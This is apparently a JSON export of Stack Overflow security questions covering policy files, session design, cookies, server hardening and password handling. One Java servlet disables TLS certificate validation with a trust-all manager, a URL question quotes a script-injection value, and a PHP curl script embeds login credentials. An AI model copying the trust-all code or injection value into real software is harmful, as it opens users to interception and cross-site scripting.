\"getClassLoader\";\npermission java.lang.RuntimePermission \"setContextClassLoader\";\npermission java.lang.RuntimePermission \"shutdownHooks\";\npermission java.lang.RuntimePermission \"setIO\";\npermission java.lang.RuntimePermission \"modifyThread\";\npermission java.lang.RuntimePermission \"modifyThreadGroup\";\npermission java.lang.RuntimePermission \"getProtectionDomain\";\npermission java.lang.RuntimePermission \"readFileDescriptor\";\npermission java.lang.RuntimePermission \"accessDeclaredMembers\";\npermission java.lang.RuntimePermission \"reflectionFactoryAccess\";\npermission java.lang.RuntimePermission \"accessClassInPackage.sun.reflect\";\npermission java.lang.RuntimePermission \"accessClassInPackage.sun.reflect.*\";\npermission java.lang.RuntimePermission \"accessClassInPackage.org.powermock\";\npermission java.lang.RuntimePermission \"defineClassInPackage.org.powermock\";\npermission java.lang.RuntimePermission \"accessClassInPackage.org.powermock.*\";\npermission java.lang.RuntimePermission \"defineClassInPackage.org.powermock.*\";\npermission java.lang.RuntimePermission \"loadLibrary\";\npermission java.lang.reflect.ReflectPermission \"*\";\npermission java.io.SerializablePermission \"*\";\n};\n\n// maven, junit and testing libraries codebase get full permissions\ngrant codeBase \"file:/usr/share/maven/lib/-\" {\npermission java.security.AllPermission;\n};\ngrant codeBase \"file:${settings.localRepository}/org/apache/maven/-\" {\npermission java.security.AllPermission;\n};\ngrant codeBase \"file:${settings.localRepository}/junit/junit/-\" {\npermission java.security.AllPermission;\n};\ngrant codeBase \"file:${settings.localRepository}/org/powermock/-\" {\npermission java.security.AllPermission;\n};\ngrant codeBase \"file:${settings.localRepository}/org/mockito/-\" {\npermission java.security.AllPermission;\n};\ngrant codeBase \"file:${settings.localRepository}/javassist/-\" {\npermission java.security.AllPermission;\n};\n\n// spring codebase gets some additional permissions suitable for bean factory\ngrant codeBase \"file:${settings.localRepository}/org/springframework/-\" {\npermission java.lang.RuntimePermission \"*\";\npermission java.io.FilePermission \"${settings.localRepository}/-\", \"read\";\n};\n</code></pre>\n\n<p>Also, the parts of my pom that runs surefire with the security manager are as follows:</p>\n\n<pre><code>&lt;profile&gt;\n    &lt;id&gt;security-manager&lt;/id&gt;\n    &lt;activation&gt;\n        &lt;activeByDefault&gt;true&lt;/activeByDefault&gt;\n    &lt;/activation&gt;\n    &lt;properties&gt;\n        &lt;test.env&gt;-Dtest.basedir=${project.build.directory}/test-classes&lt;/test.env&gt;\n        &lt;policy.file&gt;${project.build.directory}/test-classes/unit testing.policy&lt;/policy.file&gt;\n        &lt;surefire.jvm.args&gt;-Djava.security.manager -Djava.security.policy=${policy.file} ${test.env}&lt;/surefire.jvm.args&gt;\n    &lt;/properties&gt;\n&lt;/profile&gt;\n\n...\n\n&lt;plugin&gt;\n     &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;\n     &lt;version&gt;2.12.2&lt;/version&gt;\n     &lt;configuration&gt;\n          &lt;failIfNoTests&gt;false&lt;/failIfNoTests&gt;\n          &lt;skipTests&gt;false&lt;/skipTests&gt;\n          &lt;reportsDirectory&gt;${surefire.and.failsafe.report.dir}&lt;/reportsDirectory&gt;\n          &lt;forkMode&gt;always&lt;/forkMode&gt;\n          &lt;argLine&gt;${surefire.jvm.args}&lt;/argLine&gt;\n     &lt;/configuration&gt;\n&lt;/plugin&gt;\n</code></pre>\n\n<p>If have tried giving:\n    permission java.security.AllPermission;\nto the top grant block and itt works, but obviously that defeats the purpose.</p>\n\n<p>Any ideas please help.\nThanks</p>\n"},{"tags":["security","google-app-engine","session","authentication"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":89,"score":2,"question_id":12202571,"title":"Is anything wrong with my basic user authentication approach?","body":"<p>I'm a bit of a newbie when it comes to security and authentication and most other client-server communication stuff. What I'm trying to do is simple, and if possible, avoid having to bring in 3rd party frameworks and classes to do the job. (I'm using Google App Engine with Python)</p>\n\n<p>A user logs in to the service once via a mobile application (iOS). Once logged in, the user will make many requests, to get things such as messages, friends, statuses, etc. So each time the app talks to the server, rather than sending that user's email and password to authenticate, we'll send a session id. So far, that was just my understanding of the system. </p>\n\n<p>I've come up with an extremely simple approach, which to me seems like it will work just fine, but being inexperienced I'm probably not seeing many things. What would be wrong with doing this:</p>\n\n<ol>\n<li><p>on device, user types in email/password, the credentials are sent to the server and verified, and once authenticated, a random number is generated. This random number is stored as an IntegerProperty on the User model with the name session_number. </p></li>\n<li><p>the session_number is sent to the user's device and is saved. Now, anytime the user connects to the server for a request, the session_number <strong>along with</strong> the user's integer id number are sent to the server. We get the User entity for that userId, and now we compare the value of user.session_number == incoming_session_number. If they match, we're good, else error.</p></li>\n<li><p>If the user logs out, we clear the session_number from the data store. </p></li>\n</ol>\n\n<p>The only other question here is how would this be handled when the user is logged in from multiple devices? Should each device store its own session_number?</p>\n"},{"tags":["security","hash","https","passwords","bcrypt"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12204871,"title":"Can I prevent a local user from snooping on HTTPS headers containing a manager password?","body":"<p>My program sends a request to a web page over SSL and in the header (https://example.com/index.php?clientid=xxxx?spcode=xxxx) is a manager password used to determine if they are a valid client of my system before I send them a bunch of data. </p>\n\n<p>If a rogue employee were to obtain this password by snooping on the local SSL data, he could potentially toy with client orders being sent and received if he were to guess order numbers (not hard).</p>\n\n<p>I'm aware of how to use bcrypt to protect someone's password on my system. But how do I protect someone's password when <em>someone else</em> is using they're system?</p>\n\n<p>I know you shouldn't send a pre-hashed password at risk of revealing your salt. Should I use some soft of temporary transmission hash (one that differs from what I store it in the DB with). I'm thinking this isn't the best way, so I'm asking you all for help. I've found some great tips here at Stack Exchange. </p>\n\n<p>Thank you in advance for your time, everyone. I look forward to your thoughts. </p>\n"},{"tags":["php","apache","security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":102,"score":-1,"question_id":12169818,"title":"In PHP, how can I detect that input vars were truncated due to max_input_vars being exceeded?","body":"<p>I know that an <code>E_WARNING</code> is generated by PHP, but how can I detect this in my script?</p>\n"},{"tags":["security","windows-7-x64","windows-firewall"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12203626,"title":"How to prevent system-generated firewall rule changes in standalone Windows 7 Home Premium install","body":"<p>I'd like to \"freeze\" firewall rules on a Windows 7 Home Premium (x64) stand-alone install such that the only way to alter the firewall rules is to manually define such rules from the Windows Firewall with Advanced Security MMC Snap-in. I have encountered situations (i.e. installs, updates, etc) where the system automagically defines new rules without explicit user approval. <strong>Is there a registry key setting/ MMC panel option/ other solution to lock down the firewall in such a manner?</strong> \nI do not mind having to go into the registry to \"unlock\" the ability to change the firewall rules if a total lock-out option is the only option available. After researching this a bit, I have yet to find a solution that does not require Windows Server group policies. Many thanks!</p>\n"},{"tags":["security","jboss","logout"],"answer_count":0,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":60,"score":3,"question_id":12165379,"title":"Can I get the username in a Picketlink Logout Handler?","body":"<p>I'm extending the SAML2LogOutHander to add a bit of functionality and I want to determine which user sent the logout request.  However, currently I can't seem to find a way to get this information.  Is this available?  If so, how would I retrieve it?</p>\n"},{"tags":["java","security","ssl","https","ssl-certificate"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":228,"score":0,"question_id":12190282,"title":"SSLHandshakeException when i try to send a get or post https request from my webapp in tomcat server","body":"<p>Follwing exception is thrown when send https request from my webapp in tomcat server</p>\n\n<blockquote>\n  <p>javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target</p>\n</blockquote>\n\n<p>here is my servelet</p>\n\n<pre><code>/*\n * To change this template, choose Tools | Templates\n * and open the template in the editor.\n */\npackage LBS;\n\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.net.HttpURLConnection;\nimport java.net.Proxy;\nimport java.net.SocketAddress;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport javax.net.ssl.HttpsURLConnection;\n//import javax.net.ssl.SSLContext;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.security.cert.X509Certificate;\nimport javax.net.*;\nimport javax.net.ssl.*;\nimport java.security.cert.*;\n\n\n/**\n *\n * @author Ruwan\n */\npublic class LBS2 extends HttpServlet {\n\n/** \n * Processes requests for both HTTP &lt;code&gt;GET&lt;/code&gt; and &lt;code&gt;POST&lt;/code&gt; methods.\n * @param request servlet request\n * @param response servlet response\n * @throws ServletException if a servlet-specific error occurs\n * @throws IOException if an I/O error occurs\n */\nprotected void processRequest(HttpServletRequest request, HttpServletResponse response)\n        throws ServletException, IOException {\n    response.setContentType(\"text/html;charset=UTF-8\");\n    PrintWriter out = response.getWriter();\n    try {\n        LBS2 s=new LBS2();\n        s.myReq();\n\n    } finally {            \n        out.close();\n    }\n}\n\n\n\npublic void myReq(){\n  System.setProperty(\"https.proxyHost\", \"10.48.242.90\");\n  System.setProperty(\"https.proxyPort\", \"3128\");\n        String uri = \"https://somthing.com/abc?username=USERNAME&amp;password=PASWORD\";\n\n    try{\n        SSLContext sslctx = SSLContext.getInstance(\"SSL\");\n        sslctx.init(null, new X509TrustManager[] { new MyTrustManager()}, null);\n        HttpsURLConnection.setDefaultSSLSocketFactory(sslctx.getSocketFactory());\n        URL url = new URL(uri);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"GET\");\n        con.setDoOutput(true);\n        con.connect();\n        if (con.getResponseCode() == HttpsURLConnection.HTTP_OK) {\n            BufferedReader br = new BufferedReader(new\n            InputStreamReader(con.getInputStream()));\n            String line;\n            while((line = br.readLine()) != null) {\n            System.out.println(line);\n            }\n            br.close();\n        }\n        con.disconnect();\n\n        }\n        catch(Exception e){\n        System.out.println(e.toString());\n        }\n}\n\n\n    // &lt;editor-fold defaultstate=\"collapsed\" desc=\"HttpServlet methods. Click on the +     sign on the left to edit the code.\"&gt;\n    /** \n * Handles the HTTP &lt;code&gt;GET&lt;/code&gt; method.\n * @param request servlet request\n * @param response servlet response\n * @throws ServletException if a servlet-specific error occurs\n * @throws IOException if an I/O error occurs\n */\n@Override\nprotected void doGet(HttpServletRequest request, HttpServletResponse response)\n        throws ServletException, IOException {\n    processRequest(request, response);\n}\n\n/** \n * Handles the HTTP &lt;code&gt;POST&lt;/code&gt; method.\n * @param request servlet request\n * @param response servlet response\n * @throws ServletException if a servlet-specific error occurs\n * @throws IOException if an I/O error occurs\n */\n@Override\nprotected void doPost(HttpServletRequest request, HttpServletResponse response)\n        throws ServletException, IOException {\n    processRequest(request, response);\n}\n\n/** \n * Returns a short description of the servlet.\n * @return a String containing servlet description\n */\n@Override\npublic String getServletInfo() {\n    return \"Short description\";\n}// &lt;/editor-fold&gt;\n}\n\n\nclass MyTrustManager implements X509TrustManager {\n        @Override\n            public void checkClientTrusted(X509Certificate[] chain, String\n            authType) {\n            }\n\n        @Override\n            public void checkServerTrusted(X509Certificate[] chain, String\n            authType) {\n            }\n\n        @Override\n            public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[0];\n        }\n }    \n</code></pre>\n\n<p>Please help me to find the problem with SSL Certificat handling in this code\nthnks in advance</p>\n"},{"tags":["c#","vb.net","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":69,"score":-6,"question_id":12198646,"title":"Web App Security Issues - VB or C#?","body":"<p>Assume I write two web sites, one in C# and one in VB that perform the same actions and I put into place the same security on both sites. </p>\n\n<p>Will the VB web site be less secure than the C# web site?</p>\n\n<p>I believe there are no additional security issues with VB versus C#, however I would like to confirm that I am correct.</p>\n"},{"tags":["security","cookies","cryptography"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":227,"score":2,"question_id":3831921,"title":"How do I create a cookie which is theft-proof and can not be tampered by a user/client?","body":"<p>Theft-proof means I can detect that this is coming from a different client IP or over a different route (like when client is behind proxy or something) .</p>\n\n<p>Tamper proof means I can detect that the cookie is not valid and not sent by server.</p>\n"},{"tags":["security","umbraco","elmah"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":10439698,"title":"How to secure the ELMAH web console in Umbraco?","body":"<p>How can requests to <strong>/elmah.axd</strong> be limited to an <strong>Umbraco admin user</strong>.</p>\n\n<p>It is my understanding that the Umbraco membership and role providers apply to Umbraco <em>Members</em> but not <em>Users</em> -- Umbraco user accounts do not appear to have a user name or role (e.g. \"Admins\") that could be used in the web.config like this:</p>\n\n<pre><code>&lt;location path=\"elmah.axd\"&gt;\n  &lt;system.web&gt;\n    &lt;authorization&gt;\n        &lt;allow roles=\"Admins\" /&gt;\n        &lt;deny users=\"*\" /&gt;\n    &lt;/authorization&gt;\n  &lt;/system.web&gt;\n&lt;/location&gt;\n</code></pre>\n\n<p>This is a recommended way of securing ELMAH in other ASP.Net applications.</p>\n\n<p>Anyone done this in Umbraco?</p>\n"},{"tags":["security","jetty","localhost"],"answer_count":3,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":4433,"score":4,"question_id":1955455,"title":"How to secure Jetty to only allow access from loopback(localhost)","body":"<p><strong>How can I secure <a href=\"http://www.mortbay.org/jetty/\" rel=\"nofollow\">jetty</a> to only allow connections from localhost?</strong> This means a connection to <em>server A on System A</em> from <em>Client B on System B</em> has to fail. I know I can do this by configuring my firewall (so please no answers about this). I just want Jetty to only listen on localhost(loopback).</p>\n"},{"tags":["security","authentication","mobile"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12196094,"title":"secure mobile app to communicate with web app, determine it is actually the mobile app communicating","body":"<p>I want to be sure that the client asking for HTTP get requests at my web app server is coming specifically from my mobile app and not from anything else. I have considered different options and still have not come up with anything. Most importantly I do not want there to be user interaction, I want the mobile app itself to handle this. The best I've come up with is having a secret key on the mobile app that the web app has prior knowledge to, but if the mobile app was ever decompiled or the key was uncovered somehow then this would be useless.\nCommunication between the two is encrypted in AES 128bit CBC cipher with a random IV-- which is passed back and forth in plain text and changes after each transaction.</p>\n\n<p>Is being certain communication is coming from the mobile app something that is simply not possible, logistically, and requires human intervention-- such as requiring the user to type in a password that they remember and that is already set up on the server?</p>\n\n<p>Ultimately the mobile app updates a database on the web app server and so I want to make sure the requests are being made from the app and not someone posing as the app.</p>\n"},{"tags":["security","curl","ssh","solaris"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12192820,"title":"Password Management on Solaris","body":"<p>I'm currently looking for a Password Management Tool for Solaris 11 Sparc 64.\nMy Company needs to save an encrypted DB with about 400 hostnames &amp; passwords on a Sparc Server.\nOur team should have access over SSH/curl to this DB and there are some requirements like search functions, acls, good security etc. so a simple script won't do the job.\nI've been looking for something professional for a long time but I haven't found anything for this platform, do you guys have a proposal for my problem?</p>\n\n<p>Thanks a lot</p>\n"},{"tags":["php","security","curl","login"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12200128,"title":"Using curl with PHP to authenticate - mysterious security","body":"<p>I'm trying to make a script that would run through some sites that I visit every day and get the most interesting info/statistics from them. I wanted to use curl for this purpose, because some of these sites require authentification. Everything was ok until I bumped into the site: rossnet.pl which seems to be somehow secured 'cause I can't authenticate myself at all.</p>\n\n<p>The form that I want to use can be found here:\n<a href=\"https://www.rossnet.pl/rossnetlogin.aspx\" rel=\"nofollow\">https://www.rossnet.pl/rossnetlogin.aspx</a></p>\n\n<p>On the left, under the text: \"Mam konto w Rossnet.pl - Logowanie\". It doesn't seem to have any hidden input fields, only two text fields for credentials, called:\n- \"dnn$ctr1203$ViewLogin$txtUserLogin\"\n- \"dnn$ctr1203$ViewLogin$txtUserPass\"</p>\n\n<p>I'm using the code shown below but the page returned by the server seems as if exactly nothing happened (no error messages, it seems to look the same as when I don't send any POST data).</p>\n\n<p>Does anyone have a clue about what may be wrong? In the code below I put in actual account credentials for you to be able to test the script if you wish to help me.</p>\n\n<p>Here you can see how does the script below work on my server:\n<a href=\"http://kremuwa.netii.net/rossman/skrypt.php\" rel=\"nofollow\">http://kremuwa.netii.net/rossman/skrypt.php</a> </p>\n\n<pre><code>&lt;?php\n\n$url = \"https://www.rossnet.pl/rossnetlogin.aspx\";   \n\n$ch = curl_init();  \n\ncurl_setopt($ch, CURLOPT_URL, $url);\ncurl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');\ncurl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');\ncurl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13');\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\ncurl_setopt($ch, CURLOPT_HEADER, 1);        \ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\n\ncurl_setopt($ch, CURLOPT_REFERER, $url);\ncurl_setopt($ch, CURLOPT_POST, 1);\ncurl_setopt($ch, CURLOPT_POSTFIELDS, 'dnn$ctr1203$ViewLogin$txtUserLogin=warzywko3000&amp;dnn$ctr1203$ViewLogin$txtUserPass=password123');\n\n$output = curl_exec($ch);  \n\ncurl_close($ch);  \n\necho $output;\n\n?&gt;\n</code></pre>\n"},{"tags":["security","tomcat","struts2","web-security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12199805,"title":"struts2 app on Tomcat 5.5: Basic user/pass security?","body":"<p>I'm working on a simple CRUD app that will be hosted on our intranet, available to a few users.  I'm using struts2 and Tomcat 5.5.</p>\n\n<p>I've read a bunch of guides on how to implement security using Tomcat; using code; using LDAP integration; or a combination of them.  As the app is simple, I'd like the auth to be of equivalent simplicity.</p>\n\n<p>My current idea involves storing a \"logged in\" attribute in the session, and if that's not present, redirecting users to an error message and the login page.  I think, though, that I'd have to do this in every action method, to prevent someone from doing a form submit directly to an action.</p>\n\n<p>What's the easiest/most basic way to implement security on such an app?</p>\n"},{"tags":["java","javascript","html","security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12194284,"title":"how can I clean and sanitize a url submitted by a user for redisplay in java?","body":"<p>I want a user to be able to submit a url, and then display that url to other users as a link.</p>\n\n<p>If I naively redisplay what the user submitted, I leave myself open to urls like </p>\n\n<pre><code>http://somesite.com' &gt;&lt;script&gt;[any javacscript in here]&lt;/script&gt;\n</code></pre>\n\n<p>that when I redisplay it to other users will do something nasty, or at least something that makes me look unprofessional for not preventing it.</p>\n\n<p>Is there a library, preferably in java, that will clean a url so that it retains all valid urls but weeds out any exploits/tomfoolery?</p>\n\n<p>Thanks!</p>\n"},{"tags":["asp.net","security","redirect"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1684,"score":3,"question_id":259534,"title":"Redirects to default.aspx instead of \"xxx.aspx\" after logging into app using login control","body":"<p>Thanks for going to answer my question. I have the folowing pages.</p>\n\n<ul>\n<li>login.aspx</li>\n<li>default.aspx</li>\n<li>xxx.aspx</li>\n</ul>\n\n<p>After logging into application default.aspx will be displayed. Now if the user is trying to open <a href=\"http://server/\" rel=\"nofollow\">http://server/</a><strong>xxx.aspx</strong>?Id=1234 by specifying its URL directly in a browser, the login screen is displayed and after successfull login, system redirects to \"default.aspx\" and not to \"http://server/<strong>xxx.aspx</strong>?Id=1234\". Actually there is an external application that would call my system like that. So Please let me know why is this happening. The .Net login control is used to login into the application. Kindly help me to solve this issue.</p>\n\n<p>Thanks,<br>\nAng Vin</p>\n"},{"tags":["php","security",".htaccess"],"answer_count":3,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":2063,"score":1,"question_id":3703449,"title":"How to prevent PHP files from being downloaded? And what are some ways someone can download them?","body":"<p>How do i prevent php files from being downloaded \"illegally\" like through the browser.  And what are some ways someone can use to download the php files?</p>\n"},{"tags":["asp.net-mvc","wcf","security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":156,"score":0,"question_id":12067279,"title":"Communication between asp.net MVC application and WCF services with windows based security","body":"<p>I'm making an asp.net MVC application that communicates with  wcf services on IIS.\nThe asp.net MVC application works with a normal login mechanism (username, password). In the wcf services I want to log in (with this password and username) to get the windowsidentity of the user.(the security on the wcf services are windows based)</p>\n\n<p>The issue is how can I communicate from the asp.net MVC application with the services in this way and keep the asp.net MVC application as stateless as possible (putting a password in the session state is definately not allowed)</p>\n\n<p>Ideas about how to get this done are very much appreciated.</p>\n\n<p>This drawing might make things clearer:\n<img src=\"http://i.stack.imgur.com/TndXa.jpg\" alt=\"Architecture Mobile App Website\"></p>\n"},{"tags":["java","security","jre","java-7"],"answer_count":2,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":300,"score":4,"question_id":12169902,"title":"JRE 1.7 Vulnerability","body":"<p>Today, our Enterprise Architect mentioned that a recent vulnerability was discovered in the JRE 1.7.  I found an article the <a href=\"http://www.theregister.co.uk/2012/08/27/disable_java_to_block_exploit/\" rel=\"nofollow\">JRE 1.7 vulnerability recommending disabling Java</a>. </p>\n\n<p>I am running JDK 1.5 and 1.6 at work (like many organizations, we're not on the latest of technologies), so no problems there.  </p>\n\n<p>At home I am doing development with Java SE 7u6.  I'm playing with Grails, Spring Security, trying to keep learning.  </p>\n\n<p>I have already gone and disabled the Java Plug-in in all my browsers on my home development machine.  However, does anyone know if my home dev machine is still vulnerable by virtue of having the JDK 7 installed?  I did find this article on US-CERT declaring the vulnerability notice: <a href=\"http://www.kb.cert.org/vuls/id/636312\" rel=\"nofollow\">Oracle Java JRE 1.7 Expression.execute() fails to restrict access to privileged code</a>.  </p>\n\n<p>It sounded like as long as the browser is not able to run Applets, I should be fine (it should not with the Java Plug-in disabled).  However, what about Java Web Start/JNLP?  Could that get invoked?  That's the only other thing I could think of, other than Applets, that might be of concern.  </p>\n\n<p>Just wondering if I need to go through the efforts of uninstalling my Java SE 7 and dropping back to a JDK6.  </p>\n\n<p>What have others done upon learning of this security issue with JRE 1.7? </p>\n"},{"tags":["c#",".net","security"],"answer_count":3,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":1870,"score":6,"question_id":1170738,"title":"How to make form system modal using C#?","body":"<p>I need to show form as top level system-wide, e.g. over /all/ other windows on screen. I do realize this is usually /bad UI practice/, but I have very specific scenario in mind. </p>\n\n<p>We intend to use normal Windows PCs for POS cash registrators. There is an option on the screen to open cash drawer. It would be rather bad for someone just to press something on a screen and get access to money when clerk isn't looking. So we equiped PCs with RFID readers and each clerk has his/her own RFID card which will be used for authentication. </p>\n\n<p>I need however an mechanism to lock the computer (or make it unusable) when clerk goes away. Logging off seems too much of a nuisance.</p>\n\n<p>Any ideas welcome.</p>\n\n<p>LP,\nDejan</p>\n"},{"tags":["java","security","proguard"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":141,"score":0,"question_id":12193981,"title":"Hide password in Java source code","body":"<p>I need to hide the password in the source, what are the possible methods to obfuscate the password in order to reduce the risk of decompilation?</p>\n\n<p>e.g. </p>\n\n<pre><code>final String password = \"secret\";\n</code></pre>\n"},{"tags":["security","internet-explorer"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":9598026,"title":"Display unsecure content in IE9","body":"<p>I have a large webproject that in IE9 doesnt display some of the pages elements since the browser deems them \"unsecure\" in some way. We can ask our users to enable \"display mixed content\" in IE9 but would of course prefer to solve this on the server side. </p>\n\n<p>Ive used firebug to track the webtraffic and cant see any http:// requests beeing made via the net-tab. I thought this was what caused the error. Is there any other possible way to troubleshoot this.. I just dont know what elements or settings could cause this problem (since all our traffic seems to go through https it has to be something else IE is reacting to?).</p>\n"},{"tags":["php","security","amazon-s3"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":114,"score":0,"question_id":10943318,"title":"How Do I Secure My Amazon S3 Buckets","body":"<p>I have Amazon S3, which contains a bunch of my videos (for Internet Marketing). I also have images, scripts, packaged courses, video tutorials, all kinds of stuff. All the files are sorted through different folders inside my Amazon bucket.</p>\n\n<p>The issue is, all the files are easily available to anyone using some Amazon S3 Bucket ripping programs. You just enter the bucket name, and boom you can just rip everything. I also received an email from Amazon a little while back about my bucket being insecure and publicly accessible.</p>\n\n<p>I guess I have to setup some bucket policy?</p>\n\n<p>I need the ability to embed the videos on my various web sites (video squeeze pages). Also with my training area, it too has embedded video tutorials, as well as some zip files for members to download, ect. Also my JWPlayer SWF controller file and the matching jwplayer.js file, are both located on my Amazon S3 (so that it loads fast, and all my video embeds use it, so I don't have jwplayer uploaded 20 different times across many sites).</p>\n\n<p>How am I going to not make the Bucket publicly accessible, but yet it still can embed on my pages. I can't set it to only allow a domain, because it will be used across many sites. I could allow it from the IP of my server? If I did have it use the domain, I could have 1 site as the redirect just to set the referrer. Like a controlling PHP file that has permission to access the S3...</p>\n\n<p>Any help, links, insight on how I can get this working and secured would be great. Thanks in advance!</p>\n"},{"tags":["android","security","certificate"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":113,"score":1,"question_id":12148294,"title":"Using X509 certificate in android application","body":"<p>I am developing an android application that uses a public key certificate to sign messages sent to the server. When the user logs in, he receives a x509 certificate. Now, when he wants to send messages to the server, he has to sign the message using the certificate public key and send it to the server along with the message. I am new to security and I don't know how to go about this. These are some of the questions I have:</p>\n\n<ol>\n<li><p>How can i securely store the certificate in the phone so that my app can use it to sign messages sent to the server?</p></li>\n<li><p>I am also planning to do key rotation once in some time. So, the server will send the updated certificate to the user and my app has to update the certificate stored in the phone. </p></li>\n</ol>\n\n<p>If you can point me to a tutorial or any issues i need to carefully handle , it will be really helpful. Thanks</p>\n"},{"tags":["security","accessibility","policy"],"answer_count":7,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":444,"score":3,"question_id":1142028,"title":"what should developers have access to?","body":"<p>i work at a place where we build applications that process and store sensitive data. \nwe have 3 environments. Dev, UAT / QA (user acceptant testing) and Production</p>\n\n<p>the developers at my work have no access to UAT or Production and have limited access to Dev. All we can do in dev is connect to a dev DB server . we have no access to the dev server itself. so we arent allowed to play with things like the web server (iis)  on dev.  if we want changes we must go though a formal process of submitting work requests to our network administrators (which could takes days to complete). \nthe same goes if a developer were to request for something to be checked in a UAT or PRod database.\nthis strict access restriction is really frustrating when trying to support our applications.</p>\n\n<p>i can understand why we have these policies, as it reduces the risk of things getting screwed up. but this makes solving issues really time consuming and painful. something that could take 5 mins to fix (if a developer had access) could take days to resolve. </p>\n\n<p>is this sort of strict access rights normal?</p>\n"},{"tags":["security","keylogger"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":275,"score":0,"question_id":5482874,"title":"What is the basic purprose and function of a keylogger?","body":"<p>Ok I know I might seem a bit noobish, but I'm very new to this term. I think it has to do with recording what ever the user is typing into the system and recording it without the user knowing his confidentiality is being compromised.</p>\n\n<p>So thats my basic understanding of the functionality of a key logger. Am I correct?</p>\n\n<p>Is is purpose to compromise confidentiality?\nIs that the only application of key loggers?\nWhat is the key logger suppose to show and it output?</p>\n\n<p>Before I go on making one in C#, I want to have a clear vision of what a key logger is suppose to do.</p>\n"},{"tags":["javascript","security","risk"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1550,"score":2,"question_id":3793246,"title":"Javascript security risks?","body":"<p>What are the risks of using Javascript and how to avoid them?</p>\n"},{"tags":["security","scalability","file-organization"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12178171,"title":"User-files organization in a Web server","body":"<p>I'm developing a Web application where users can upload files.</p>\n\n<p>Suppose to have different file categories, e.g. <em>audio</em> and <em>docs</em>. I guess I can put all the files that belongs from a category in a unique folder, e.g.:</p>\n\n<pre><code>audio_dir\n  -file_from_user1.mp3\n  -another_file_from_user1.mp3\n  -file_from_user2.mp3\n  -file_from_user4.mp3\ndocs_dir\n  -file_from_user1.doc\n  -file_from_user5.pdf\n</code></pre>\n\n<p>The other solution I'm evaluating uses a third level, where files are grouped by users. </p>\n\n<pre><code>audio_dir\n  user1_dir\n    -file_from_user1.mp3\n  user2_dir\n    -file_from_user2.mp3\n  user4_dir\n    -file_from_user4.mp3\ndocs_dir\n  user1_dir\n    -file_from_user1.doc\n  user5_dir\n    -file_from_user5.pdf\n</code></pre>\n\n<p>Which solution is the best?\nPlease, notice that I'm interested in server <strong>security vulnerabilities</strong> and <strong>scalability</strong>.</p>\n"},{"tags":["php","security","templates","login","boilerplate"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":85,"score":1,"question_id":12190251,"title":"Is this PHP Login secure? [Boilerplate]","body":"<p>I have created this php-Login, which will serve as a template.</p>\n\n<p><a href=\"https://github.com/sinky/php-login-boilerplate\" rel=\"nofollow\">https://github.com/sinky/php-login-boilerplate</a></p>\n\n<p>My question, is this php-Login secure? Does it work proper?\nIs it possible to get logged in without the password?\n(SSL is not taken into consideration.)</p>\n\n<p>Thank you for improvements.\nGreetings 